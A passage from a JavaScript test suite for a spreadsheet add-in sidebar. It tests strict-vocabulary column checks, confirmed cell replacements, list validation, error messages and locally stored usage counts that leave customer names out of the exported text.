  const saved = pane.ui.strict.button("Turn it on");
  pane.ui.configText.value = ORGANIZATION;
  await pane.ui.save.click();
  host.calls.length = 0; // the save itself
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null);
  await saved.click();
  assert.deepEqual(host.calls, []);
  // A check made with the document's list: its Replace button asks nothing once the organisation's is back.
  const again = strictHost(cell, { column: columnOf(cell) });
  again.config(JSON.stringify(doc));
  const next = Pane().createPane({ document, root: new Node("div"), bridge: again.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await next.start();
  await next.ui.origin.button("Use the document's configuration").click();
  await next.ui.strict.button("Check this column").click();
  assert.deepEqual(next.ui.strict.find((n) => n.attrs.id === "actle-strict-fixes").all((n) => n.tagName === "li").map((n) => n.textContent), ['C2: "Ops" → "CC-900 Document Only"'], "Ops is an alias in the document's list only");
  const replace = next.ui.strict.button("Replace 1 alias with the list's spelling");
  await next.ui.origin.button("Stop using it").click();
  await replace.click();
  assert.equal(next.ui.strict.find((n) => n.className === "confirm"), null, "no question from the document's check");
  assert.equal(next.ui.strict.button("Replace 1 cell"), null);
  assert.deepEqual(again.calls, []);
});

test("after a replacement, a read of the selection that fails adds to the report instead of replacing it, and the question and the old check leave the screen", async () => {
  const unreadable = () => { throw new Error("Exceeded maximum execution time"); };
  for (const [answer, report] of [
    [{ written: [3, 5], skipped: [], computed: [] }, "Wrote the list's spelling into 2 cells of column C."],
    [{ written: [3], skipped: [], computed: [], failed: { row: 5, message: "C5 is protected" } }, "Wrote the list's spelling into 1 cell of column C, then stopped at C5 (C5 is protected); nothing after it was written."],
  ]) {
    const host = strictHost(plain(COST_CELL));
    const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
    await pane.start();
    await pane.ui.strict.button("Check this column").click();
    await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
    // The write lands; the read after it fails (a sidebar call that timed out).
    host.bridge.replaceValues = async () => { host.bridge.readContext = async () => unreadable(); return answer; };
    await pane.ui.strict.button("Replace 2 cells").click();
    assert.equal(pane.ui.message.textContent, report + " Could not read the column again: Exceeded maximum execution time");
    assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null, "the question is gone");
    assert.equal(pane.ui.strict.button("Replace 2 cells"), null, "and its buttons");
    assert.equal(pane.ui.strict.button("Cancel"), null);
    assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "and the check made before the write");
    assert.ok(pane.ui.strict.button("Check this column"), "the column's tools are back");
  }
  // A replacement that throws keeps the check for a retry, and its note stays in front of the read's failure.
  const host = strictHost(plain(COST_CELL));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  host.bridge.replaceValues = async () => { host.bridge.readContext = async () => unreadable(); throw new Error("the script was stopped"); };
  await pane.ui.strict.button("Replace 2 cells").click();
  assert.equal(pane.ui.message.textContent, "Could not write the list's spelling into column C: the script was stopped. Cells written before the error, if any, keep the list's spelling. Could not read the column again: Exceeded maximum execution time");
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null);
  assert.ok(pane.ui.strict.find((n) => n.className === "check-summary"), "the check stays");
  assert.ok(pane.ui.strict.button("Replace 2 cells with the list's spelling"));
  await pane.ui.refresh.click();
  assert.equal(pane.ui.message.textContent, "Cannot read the selection: Exceeded maximum execution time", "a read that fails on its own is said as before");
});

test("while a confirmed write is on its way, the status line says so and no column tool is offered, so a redraw cannot send a second request", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const write = host.bridge.replaceValues;
  let release = null;
  host.bridge.replaceValues = (target, list) => new Promise((resolve) => { release = () => resolve(write(target, list)); });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  const yes = pane.ui.strict.button("Replace 2 cells");
  const going = yes.click();
  await settle();
  assert.equal(pane.ui.message.textContent, "Writing the list's spelling into 2 cells of column C.", "not \"Nothing written yet\" while it is being written");
  await pane.refresh(); // the sidebar's poll, or a selection event, while the write is on its way
  assert.equal(pane.ui.strict.textContent, "Only values from the \"costCentres\" list.Writing the list's spelling into 2 cells of column C. The column's tools come back when the spreadsheet answers.");
  assert.deepEqual(pane.ui.strict.all((n) => n.tagName === "button"), [], "no Replace, Check or validation button to start a second request");
  await yes.click(); // the confirmation's own button, pressed again
  release();
  await going;
  assert.equal(host.calls.filter(([what]) => what === "replace").length, 1, "one request");
  assert.equal(pane.ui.message.textContent, "Wrote the list's spelling into 2 cells of column C.");
  assert.ok(pane.ui.strict.button("Check this column"), "the tools are back");
  // The same while list validation is turned on, and removed.
  let done = null;
  host.bridge.listValidation.apply = (target) => new Promise((resolve) => { done = () => resolve({ range: target.column + "2:" + target.column + "1048576" }); });
  await pane.ui.strict.button("Turn on list validation for this column").click();
  const on = pane.ui.strict.button("Turn it on").click();
  await settle();
  assert.equal(pane.ui.message.textContent, "Turning on list validation for column C.");
  await pane.refresh();
  assert.deepEqual(pane.ui.strict.all((n) => n.tagName === "button"), []);
  done();
  await on;
  assert.match(pane.ui.message.textContent, /^List validation is on for C2:C1048576 on "Budget"/);
  host.bridge.listValidation.remove = (target) => new Promise((resolve) => { done = () => resolve({ range: target.column + "2:" + target.column + "1048576" }); });
  await pane.ui.strict.button("Remove list validation").click();
  const off = pane.ui.strict.button("Remove it").click();
  await settle();
  assert.equal(pane.ui.message.textContent, "Removing the data validation from column C.");
  assert.deepEqual(pane.ui.strict.all((n) => n.tagName === "button"), []);
  done();
  await off;
  assert.equal(pane.ui.message.textContent, 'Removed the data validation from C2:C1048576 on "Budget".');
});

test("a check and a question belong to one sheet and one list: the same column letter on another sheet, or a header that brings another strict list, drops them", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  const stale = pane.ui.strict.button("Replace 2 cells");
  await host.select(Object.assign(plain(COST_CELL), { sheet: "Budget 2027" }));
  assert.equal(pane.ui.context.textContent, 'C4 on Budget 2027, column "Cost centre": vocabulary costCentres', "the same rule applies on the other sheet");
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null, "another sheet drops the question");
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "and the check");
  assert.equal(pane.ui.message.textContent, "", "and its notice");
  await stale.click();
  assert.deepEqual(host.calls, [], "a button from the other sheet's question writes nothing");
  await pane.ui.strict.button("Check this column").click();
  await host.select(plain(COST_CELL));
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "a check of Budget 2027 is not shown for Budget");
  // Two strict rules: the header of column C is edited, so the customers list applies to the same column of the same sheet.
  const two = JSON.parse(ORGANIZATION);
  two.columns = [{ match: { header: "^cost cent" }, vocabulary: "costCentres", strict: true }, { match: { header: "^customer" }, vocabulary: "customers", strict: true }];
  const other = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const second = Pane().createPane({ document, root: new Node("div"), bridge: other.bridge, core: sheets, storage: storageOf({ [KEY]: JSON.stringify(two) }) });
  await second.start();
  await second.ui.strict.button("Check this column").click();
  await second.ui.strict.button("Replace 2 cells with the list's spelling").click();
  const old = second.ui.strict.button("Replace 2 cells");
  await other.select(Object.assign(plain(COST_CELL), { header: "Customer" }));
  assert.equal(second.ui.strict.children[0].textContent, 'Only values from the "customers" list.');
  assert.equal(second.ui.strict.find((n) => n.className === "confirm"), null, "the cost centre question does not carry over to the customers list");
  assert.equal(second.ui.strict.find((n) => n.className === "check-summary"), null, "nor the cost centre check");
  await old.click();
  assert.deepEqual(other.calls, []);
});

test("a bridge that sends fewer row numbers than values gets no check", async () => {
  const host = strictHost(Object.assign(plain(COST_CELL), { rows: [2, 3] }));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  assert.equal(pane.ui.message.textContent, "Cannot check column C: the spreadsheet side of the add-in sent no row numbers. Update its files.");
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "no rows would be guessed");
});

test("the replacement's question ends with what the bridge says its host cannot tell apart", async () => {
  const host = strictHost(plain(COST_CELL));
  host.bridge.replaceNote = "A cell filled by an array formula in another cell is not recognised.";
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'Write the list\'s spelling into 2 cells of column C on "Budget", as listed above? Each cell is read again first; one that changed since the check, or that holds a formula, is left as it is. A cell filled by an array formula in another cell is not recognised.');
});

// Usage counts: what the pane counts, where it keeps them, and the hand-over text.
const USAGE = "actleSheetsUsage";
const TODAY = () => new Date(2026, 9, 23, 10);
const counters = (pane) => plain(pane.usage.state.days["2026-10-23"] || []);
const stored = (storage) => JSON.parse(storage.getItem(USAGE));
// Type into the pane's box, then choose the first completion: a written cell is not offered its own value again.
async function completeWith(pane, text) {
  pane.ui.input.value = text;
  await pane.ui.input.fire("input");
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
}

test("the pane counts each completion and block it writes, with the vocabulary's name or the trigger, and nothing for a write that was refused, failed or only proposed", async () => {
  const storage = storageOf({ [KEY]: ORGANIZATION });
  const host = strictHost(plain(CUSTOMER_CELL), { column: columnOf(Object.assign(plain(CUSTOMER_CELL), { rows: [2, 3, 5] })) });
  const root = new Node("div");
  const pane = Pane().createPane({ document, root, bridge: host.bridge, core: sheets, storage, now: TODAY });
  await pane.start();
  assert.equal(pane.ui.usageNote.textContent, "Counts are kept in this browser.");
  assert.match(texts(root, "hint").join("\n"), /per day, how many and the keystrokes they saved, with the name of the organisation's vocabulary or trigger, when it has one\./, "the notes sentence and the column's own values below give none");
  assert.equal(pane.ui.usageTotals.textContent, "Today: 0 uses, 0 keystrokes saved. Last 7 days: 0 uses, 0 keystrokes saved.");
  await pane.ui.completions.all((n) => n.className === "completion")[0].click(); // "acm" -> "Acme Logistics GmbH"
  assert.deepEqual(counters(pane), [["completion", "vocabulary", "customers", 1, 16]], "19 graphemes written, 3 typed");
  await pane.saving();
  assert.deepEqual(stored(storage).days, { "2026-10-23": [["completion", "vocabulary", "customers", 1, 16]] }, "kept in this browser after each use");
  await host.select({ sheet: "Orders 2026", address: "D4", text: "Driver was late. Prom", header: "Delivery notes", values: NOTES, clipped: false });
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  await host.select({ sheet: "Orders 2026", address: "E4", text: "jo", header: "Driver", values: ["Jonas Berg", "Jonas Berg", "Mia Lund"], clipped: false });
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  await host.select({ sheet: "Budget", address: "A10", text: "/exp", header: "Amount", values: [], clipped: false });
  await pane.ui.block.button("Insert Expense rows (2 rows x 3 columns)").click();
  pane.ui.input.value = "/vat";
  await pane.ui.input.fire("input");
  await pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))").click();
  await host.select({ sheet: "Budget", address: "C4", text: "cc-2", header: "Cost centre", values: COST_CELL.values, rows: COST_CELL.rows, clipped: false });
  await pane.ui.completions.all((n) => n.className === "completion")[0].click(); // a strict column's completion is a vocabulary's
  assert.deepEqual(counters(pane), [
    ["completion", "vocabulary", "customers", 1, 16],
    ["completion", "notes", "", 1, 17],
    ["completion", "column", "", 1, 8],
    ["block", "rows", "/exp", 1, 23],
    ["block", "formula", "/vat", 1, 14],
    ["completion", "vocabulary", "costCentres", 1, 8],
  ], "the notes sentence and the column's own value carry no name; rows count a tab or new line per cell move");
  const before = JSON.stringify(counters(pane));
  // Nothing is counted for: the strict column's check, replacement and list validation,
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  await pane.ui.strict.button("Replace 2 cells").click();
  await pane.ui.strict.button("Turn on list validation for this column").click();
  await pane.ui.strict.button("Turn it on").click();
  assert.ok(host.calls.some(([what]) => what === "replace") && host.calls.some(([what]) => what === "validate"));
  // a completion the pane refuses to write, a write the host refuses, and a block that fails,
  await host.select({ sheet: "Orders 2026", address: "D5", text: "+49 reached. Prom", header: "Delivery notes", values: NOTES, clipped: false });
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.match(pane.ui.message.textContent, /^Not written to D5/);
  host.bridge.writeValue = async () => { throw new Error("read only"); };
  await host.select(plain(CUSTOMER_CELL));
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(pane.ui.message.textContent, "Could not write to B4: read only");
  host.bridge.writeFormula = async () => { throw new Error("protected"); };
  await host.select({ sheet: "Budget", address: "A11", text: "/vat", header: "Amount", values: [], clipped: false });
  await pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))").click();
  assert.match(pane.ui.message.textContent, /^Could not insert VAT at 19% at A11: protected/);
  assert.equal(JSON.stringify(counters(pane)), before, "nothing more was counted");
  await pane.saving();
  assert.equal(JSON.stringify(stored(storage).days["2026-10-23"]), before);
  assert.equal(pane.ui.usageTotals.textContent, "Today: 6 uses, 86 keystrokes saved. Last 7 days: 6 uses, 86 keystrokes saved.");
});

test("while the document's configuration is in use a use is counted without a name, and only once it is written", async () => {
  const carried = JSON.stringify({ vocabularies: { "Client list from Q3 deal": ["Acme Logistics GmbH"] }, columns: [{ match: { header: "^customer" }, vocabulary: "Client list from Q3 deal" }], blocks: [{ trigger: "/total", formula: "=SUM(A1:A9)" }] });
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(carried);
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }), now: TODAY });
  await pane.start();
  await pane.ui.origin.button("Use the document's configuration").click();
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  await host.select({ sheet: "Orders 2026", address: "A3", text: "/total", header: "Order", values: [], clipped: false });
  await pane.ui.block.button("Insert /total (formula =SUM(A1:A9))").click();
  await pane.ui.block.button("Cancel").click();
  await pane.ui.block.button("Insert /total (formula =SUM(A1:A9))").click();
  assert.deepEqual(counters(pane), [["completion", "document", "", 1, 16]], "Insert and Cancel count nothing");
  await pane.ui.block.button("Write the formula").click();
  assert.deepEqual(counters(pane), [["completion", "document", "", 1, 16], ["block", "document", "", 1, 5]]);
  assert.equal(JSON.stringify(pane.usage.state).includes("Q3"), false, "the document's vocabulary name is kept nowhere");
  assert.equal(JSON.stringify(pane.usage.state).includes("/total"), false);
  await pane.ui.origin.button("Stop using it").click();
  await host.select(plain(CUSTOMER_CELL));
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.deepEqual(counters(pane)[2], ["completion", "vocabulary", "customers", 1, 16], "the organisation's again, with its name");
});

test("counts continue from a stored text; a browser that cannot keep them, refuses to read them or fails a save is said, and counting goes on for the session", async () => {
  const earlier = sheets.usage.createUsage({ random: () => new Uint8Array(16).fill(0x11) });
  sheets.usage.record(earlier, { kind: "block", source: "formula", name: "/vat", inserted: "=1+1", typed: "/vat" }, "2026-10-20");
  const storage = storageOf({ [KEY]: ORGANIZATION, [USAGE]: sheets.usage.serializeUsage(earlier) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage, now: TODAY });
  await pane.start();
  assert.equal(pane.usage.state.instance, "11".repeat(16), "the same instance goes on counting");
  assert.equal(pane.ui.usageTotals.textContent, "Today: 0 uses, 0 keystrokes saved. Last 7 days: 1 use, 0 keystrokes saved.");
  storage.setItem = () => { throw new Error("QuotaExceededError"); };
  await completeWith(pane, "acm");
  await pane.saving();
  assert.equal(pane.ui.usageNote.textContent, "The latest counts could not be kept (QuotaExceededError); they stay for this session, and the next use tries again.");
  assert.equal(pane.ui.usageTotals.textContent, "Today: 1 use, 16 keystrokes saved. Last 7 days: 2 uses, 16 keystrokes saved.", "still counted");
  storage.setItem = (key, value) => storage.map.set(key, String(value));
  await completeWith(pane, "acm");
  await pane.saving();
  assert.equal(pane.ui.usageNote.textContent, "Counts are kept in this browser.", "the next save that works clears the note");
  assert.deepEqual(stored(storage).days["2026-10-23"], [["completion", "vocabulary", "customers", 2, 32]], "with everything counted since");
  // No storage at all.
  const none = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage: null, now: TODAY });
  await none.start();
  assert.equal(none.ui.usageNote.textContent, "Counts are kept for this session only: this browser cannot keep them.");
  await none.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(none.ui.usageTotals.textContent, "Today: 1 use, 1 keystroke saved. Last 7 days: 1 use, 1 keystroke saved.", "the column's ACME after acm");
  // A sandbox that refuses to read: nothing is written over what it may hold.
  const writes = [];
  const refusing = { getItem: (key) => { if (key === USAGE) throw new Error("SecurityError"); return null; }, setItem: (key, value) => writes.push([key, value]) };
  const blind = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage: refusing, now: TODAY });
  await blind.start();
  assert.equal(blind.ui.usageNote.textContent, "Counts are kept for this session only: this browser refused to read them (SecurityError).");
  await blind.ui.completions.all((n) => n.className === "completion")[0].click();
  await blind.saving();
  assert.deepEqual(writes, [], "never written");
  assert.match(blind.ui.usageTotals.textContent, /^Today: 1 use,/);
  // A stored text that is not a usage text is replaced, and the pane says so.
  const broken = storageOf({ [USAGE]: "{\"format\":\"something else\"}" });
  const fresh = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage: broken, now: TODAY });
  await fresh.start();
  assert.equal(fresh.ui.usageNote.textContent, "The stored counts could not be read (it is not a usage text from the extle add-in (format extle-usage)), so counting started again. Counts are kept in this browser.");
  await fresh.ui.completions.all((n) => n.className === "completion")[0].click();
  await fresh.saving();
  assert.equal(stored(broken).format, "extle-usage");
  // An older sheets-core bundle without the usage model: the pane still completes and says why it does not count.
  const old = Object.assign({}, sheets, { usage: undefined });
  const older = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: old, storage: storageOf(), now: TODAY });
  await older.start();
  assert.equal(older.ui.usageNote.textContent, "This copy of the add-in cannot count use: its sheets-core bundle is older than pane.js. Rebuild it with build.js.");
  assert.equal(older.ui.copyUsage.attrs.disabled, "");
  await older.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(older.ui.message.textContent, 'Wrote "ACME" to B4.');
  await older.copyUsage();
  assert.equal(older.ui.usageText.value, "");
});

test("a bridge that keeps the counts gets them instead of the browser, one save at a time, and a bridge that cannot read them is never written", async () => {
  const saves = [];
  const host = fakeHost(plain(CUSTOMER_CELL));
  let kept = "";
  host.bridge.loadUsage = async () => kept;
  host.bridge.saveUsage = (text) => new Promise((resolve) => saves.push(() => { kept = text; resolve(); }));
  host.bridge.usageWhere = "with your Google account, in this script's user properties";
  const storage = storageOf({ [KEY]: ORGANIZATION });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage, now: TODAY });
  await pane.start();
  assert.equal(pane.ui.usageNote.textContent, "Counts are kept with your Google account, in this script's user properties.");
  const click = () => completeWith(pane, "acm");
  await click();
  await settle();
  assert.equal(saves.length, 1, "the first save is on its way");
  await click();
  await click();
  await settle();
  assert.equal(saves.length, 1, "no second save while the first is on its way");
  saves.shift()();
  await settle();
  assert.equal(saves.length, 1, "then one save with both later uses");
  saves.shift()();
  await pane.saving();
  assert.deepEqual(JSON.parse(kept).days["2026-10-23"], [["completion", "vocabulary", "customers", 3, 48]], "the last save holds every use");
  assert.equal(storage.getItem(USAGE), null, "not in this browser");
  host.bridge.saveUsage = async () => { throw new Error("Limit exceeded: Properties read/write"); };
  await click();
  await pane.saving();
  assert.equal(pane.ui.usageNote.textContent, "The latest counts could not be kept (Limit exceeded: Properties read/write); they stay for this session, and the next use tries again.");
  // A bridge whose read fails is not written, so counts it holds are not replaced.
  const unreadable = fakeHost(plain(CUSTOMER_CELL));
  const written = [];
  unreadable.bridge.loadUsage = async () => { throw new Error("Exceeded maximum execution time"); };
  unreadable.bridge.saveUsage = async (text) => written.push(text);
  const second = Pane().createPane({ document, root: new Node("div"), bridge: unreadable.bridge, core: sheets, storage: storageOf(), now: TODAY });
  await second.start();
  assert.equal(second.ui.usageNote.textContent, "Counts are kept for this session only: the stored counts could not be read (Exceeded maximum execution time).");
  await second.ui.completions.all((n) => n.className === "completion")[0].click();
  await second.saving();
  assert.deepEqual(written, []);
});

test("Copy for the desk puts the usage text, counts only, into a read-only box, selects it and tries the clipboard; the box is the fallback", async () => {
  const copied = [];
  const host = fakeHost(plain(CUSTOMER_CELL));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }), now: TODAY, clipboard: { writeText: async (text) => copied.push(text) } });
  await pane.start();
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(pane.ui.usageText.attrs.readonly, "");
  await pane.ui.copyUsage.click();
  const text = pane.ui.usageText.value;
  assert.deepEqual(copied, [text]);
  assert.equal(pane.ui.usageText.selected, true);
  assert.equal(document.activeElement, pane.ui.usageText);
  assert.equal(pane.ui.usageStatus.textContent, "Copied. Now paste it into the extle tab of the actle desktop app, under Usage from the add-in, and choose Import.");
  assert.equal(pane.ui.usageStatus.attrs.role, "status");
  const parsed = sheets.usage.parseUsage(text);
  assert.equal(parsed.ok, true);
  assert.deepEqual(plain(parsed.usage.days), { "2026-10-23": [["completion", "vocabulary", "customers", 1, 16]] });
  for (const secret of ["Acme", "acm", "Orders", "B4", "Customer"]) assert.equal(text.includes(secret), false, secret + " is not in the text");
  for (const clipboard of [{ writeText: async () => { throw new Error("NotAllowedError: Write permission denied."); } }, null, {}]) {
    const other = Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage: storageOf(), now: TODAY, clipboard });
    await other.start();
    await other.ui.copyUsage.click();
    assert.equal(other.ui.usageStatus.textContent, "The text is selected in the box: copy it (Ctrl+C, or Cmd+C on a Mac), then paste it into the extle tab of the actle desktop app, under Usage from the add-in, and choose Import.");
    assert.equal(other.ui.usageText.selected, true);
    assert.equal(sheets.usage.parseUsage(other.ui.usageText.value).ok, true, "an empty usage text is still one the desk reads");
  }
});

test("two panes that share the stored counts (two workbooks in one browser, two sidebars of one person) each add their own uses, and Copy includes what the other saved", async () => {
  const storage = storageOf({ [KEY]: ORGANIZATION });
  const open = () => Pane().createPane({ document, root: new Node("div"), bridge: fakeHost(plain(CUSTOMER_CELL)).bridge, core: sheets, storage, now: TODAY });
  const a = open();
  const b = open();
  await a.start();
  await b.start(); // both read the same, empty, counts
  await completeWith(a, "acm");
  await a.saving();
  await completeWith(b, "acm");
  await b.saving();
  await completeWith(a, "acm");
  await a.saving();
  assert.deepEqual(stored(storage).days["2026-10-23"], [["completion", "vocabulary", "customers", 3, 48]], "no pane's use is written over");
  assert.equal(a.ui.usageTotals.textContent, "Today: 3 uses, 48 keystrokes saved. Last 7 days: 3 uses, 48 keystrokes saved.", "the pane shows what the others saved too");
  await completeWith(b, "acm"); // b's last save is older than a's
  await b.saving();
  const writes = [];
  const setItem = storage.setItem;
  storage.setItem = (key, value) => { writes.push(key); setItem(key, value); };
  await a.copyUsage();
  assert.deepEqual(sheets.usage.parseUsage(a.ui.usageText.value).usage.days["2026-10-23"], [["completion", "vocabulary", "customers", 4, 64]], "Copy reads what is stored first");
  assert.deepEqual(writes, [], "and writes nothing when this pane has nothing new");
  // The same through a bridge whose store answers late; a read that fails keeps the uses for the next save.
  let kept = "";
  const bridged = () => {
    const host = fakeHost(plain(CUSTOMER_CELL));
    host.bridge.loadUsage = async () => { await settle(); if (host.unreadable) throw new Error(host.unreadable); return kept; };
    host.bridge.saveUsage = async (text) => { await settle(); kept = text; };
    return { host, pane: Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }), now: TODAY }) };
  };
  const one = bridged();
  const two = bridged();
  await one.pane.start();
  await two.pane.start();
  await completeWith(one.pane, "acm");
  await one.pane.saving();
  two.host.unreadable = "Exceeded maximum execution time";
  await completeWith(two.pane, "acm");
  await two.pane.saving();
  assert.equal(two.pane.ui.usageNote.textContent, "The latest counts could not be kept (Exceeded maximum execution time); they stay for this session, and the next use tries again.");
  assert.deepEqual(JSON.parse(kept).days["2026-10-23"], [["completion", "vocabulary", "customers", 1, 16]], "nothing written when the read failed");
  two.host.unreadable = "";
  await completeWith(two.pane, "acm");
  await two.pane.saving();
  assert.deepEqual(JSON.parse(kept).days["2026-10-23"], [["completion", "vocabulary", "customers", 3, 48]], "the next save brings the uses that waited, and keeps the other sidebar's");
  assert.equal(two.pane.ui.usageNote.textContent, "Counts are kept by the spreadsheet's side of the add-in.", "a bridge that does not say where says so");
  // Copy with nothing new reads the bridge's store and writes nothing back to it.
  const calls = [];
  const { loadUsage, saveUsage } = one.host.bridge;
  one.host.bridge.loadUsage = () => { calls.push("loadUsage"); return loadUsage(); };
  one.host.bridge.saveUsage = (text) => { calls.push("saveUsage"); return saveUsage(text); };
  await one.pane.copyUsage();
  assert.deepEqual(calls, ["loadUsage"], "no saveUsage when this pane has nothing new");
  assert.deepEqual(sheets.usage.parseUsage(one.pane.ui.usageText.value).usage.days["2026-10-23"], [["completion", "vocabulary", "customers", 3, 48]]);
});

test("a use is counted with the configuration in use when its write started: Stop using it while the write is on its way keeps the document's names out", async () => {
  const carried = JSON.stringify({ vocabularies: { "Client list from Q3 deal": ["Acme Logistics GmbH"] }, columns: [{ match: { header: "^customer" }, vocabulary: "Client list from Q3 deal" }], blocks: [{ trigger: "/clientX-bonus", formula: "=SUM(A1:A9)" }] });
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(carried);
  // Each write waits until the test lets it through, as a google.script.run round trip would.
  const waiting = [];
  const later = (write) => (...args) => new Promise((resolve) => waiting.push(() => resolve(write(...args))));
  host.bridge.writeValue = later(host.bridge.writeValue);
  host.bridge.writeFormula = later(host.bridge.writeFormula);
  const storage = storageOf({ [KEY]: ORGANIZATION });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage, now: TODAY });
  await pane.start();
  await pane.ui.origin.button("Use the document's configuration").click();
  const completing = pane.ui.completions.all((n) => n.className === "completion")[0].click();
  await settle();
  assert.equal(waiting.length, 1, "the completion's write is on its way");
  await pane.ui.origin.button("Stop using it").click();
  waiting.shift()();
  await completing;
  assert.equal(pane.ui.message.textContent, 'Wrote "Acme Logistics GmbH" to B4.');
  assert.deepEqual(counters(pane), [["completion", "document", "", 1, 16]], "a completion");
  await pane.ui.origin.button("Use the document's configuration").click();
  await host.select({ sheet: "Orders 2026", address: "A3", text: "/clientX-bonus", header: "Order", values: [], clipped: false });
  await pane.ui.block.button("Insert /clientX-bonus (formula =SUM(A1:A9))").click();
  const writing = pane.ui.block.button("Write the formula").click();
  await settle();
  assert.equal(waiting.length, 1, "the confirmed formula's write is on its way");
  await pane.ui.origin.button("Stop using it").click();
  waiting.shift()();
  await writing;
  assert.equal(pane.ui.message.textContent, "Inserted /clientX-bonus at A3.");
  assert.deepEqual(counters(pane), [["completion", "document", "", 1, 16], ["block", "document", "", 1, 0]], "and a confirmed block");
  await pane.saving();
  for (const name of ["Q3", "clientX"]) {
    assert.equal(JSON.stringify(pane.usage.state).includes(name), false, name + " is kept nowhere");
    assert.equal(storage.getItem(USAGE).includes(name), false, name + " is not stored");
  }
});

test("a use counted while a save reads an empty store is saved once, the counts shown keep the uses a save did not carry, and Copy waits for a save that works", async () => {
  let kept = "";
  let gate = null; // while set, a read of the store waits for it
  let saves = 0;
  let failFrom = Infinity; // the save from which saveUsage throws
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.bridge.loadUsage = async () => { if (gate) await gate.promise; return kept; };
  host.bridge.saveUsage = async (text) => { saves += 1; if (saves >= failFrom) throw new Error("Limit exceeded: Properties read/write"); kept = text; };
  const hold = () => { let release; const promise = new Promise((resolve) => { release = resolve; }); gate = { promise, release }; };
  const open = () => { const g = gate; gate = null; g.release(); };
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }), now: TODAY, clipboard: null });
  await pane.start();
  hold();
  await completeWith(pane, "acm");
  await completeWith(pane, "acm"); // counted while the first save waits for its read of an empty store
  open();
  await pane.saving();
  assert.deepEqual(JSON.parse(kept).days["2026-10-23"], [["completion", "vocabulary", "customers", 2, 32]], "two uses stored, not three");
  assert.equal(pane.ui.usageTotals.textContent, "Today: 2 uses, 32 keystrokes saved. Last 7 days: 2 uses, 32 keystrokes saved.");
  // A use counted while a save is on its way, and the save after it fails: the counts shown still hold it.
  hold();
  await completeWith(pane, "acm");
  await completeWith(pane, "acm");
  failFrom = saves + 2;
  open();
